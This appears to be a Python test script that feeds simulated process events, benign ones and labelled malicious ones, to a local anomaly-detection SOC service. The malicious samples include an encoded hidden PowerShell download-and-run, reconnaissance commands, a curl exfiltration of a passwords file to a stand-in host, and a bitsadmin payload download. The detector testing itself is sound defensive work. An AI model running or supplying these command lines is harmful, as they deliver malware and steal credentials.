import requests
import time
import random

BASE_URL = "http://localhost:8000"

# 1. Примеры нормального поведения (для обучения)
normal_events = [
    {"process_name": "chrome.exe", "command_line": "C:\\Program Files\\Google\\Chrome\\chrome.exe --type=renderer", "user": "onege"},
    {"process_name": "slack.exe", "command_line": "C:\\Users\\onege\\AppData\\Local\\slack\\slack.exe", "user": "onege"},
    {"process_name": "python.exe", "command_line": "python main.py", "user": "onege"},
    {"process_name": "explorer.exe", "command_line": "C:\\Windows\\explorer.exe", "user": "system"},
    {"process_name": "svchost.exe", "command_line": "C:\\Windows\\system32\\svchost.exe -k netsvcs", "user": "system"}
]

# 2. Примеры подозрительного поведения (аномалии)
malicious_events = [
    {"process_name": "powershell.exe", "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABjID0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAkAGMALgBkAG8AdwBuAGwAbwBhAGQAZgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwBhAHQAdABhAGMAawBlAHIALgBjb20ALwBiAGEAYwBrAGQAbwBvAHIALgBlAHgAZQAnACwAJwBjADoAXAB0AGUAbQBwAFwAYgAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIAAnAGMAOgBcAHQAZQBtAHAAXABiAC4AZQB4AGUAJwA=", "user": "onege"},
    {"process_name": "cmd.exe", "command_line": "whoami /all & net user & ipconfig /all", "user": "onege"},
    {"process_name": "curl.exe", "command_line": "curl -X POST http://malicious-site.com/exfiltrate --data @C:\\Users\\onege\\Documents\\passwords.txt", "user": "onege"},
    {"process_name": "bitsadmin.exe", "command_line": "bitsadmin /transfer myDownloadJob /download /priority high http://evil.com/payload.exe C:\\temp\\payload.exe", "user": "system"}
]

def send_to_soc(event):
    try:
        response = requests.post(f"{BASE_URL}/ingest", json=event)
        print(f"Sent: {event['process_name']} | Status: {response.status_code} | Result: {response.json().get('severity')}")
    except Exception as e:
        print(f"Error: {e}. Убедись, что FastAPI запущен!")

if __name__ == "__main__":
    print("--- Отправка нормальных данных для обучения ---")
    for _ in range(20): # Модели нужно хотя бы 10-20 событий для старта
        event = random.choice(normal_events)
        send_to_soc(event)
        time.sleep(0.1)

    print("\n--- Отправка подозрительных событий ---")
    for event in malicious_events:
        send_to_soc(event)
        time.sleep(1)
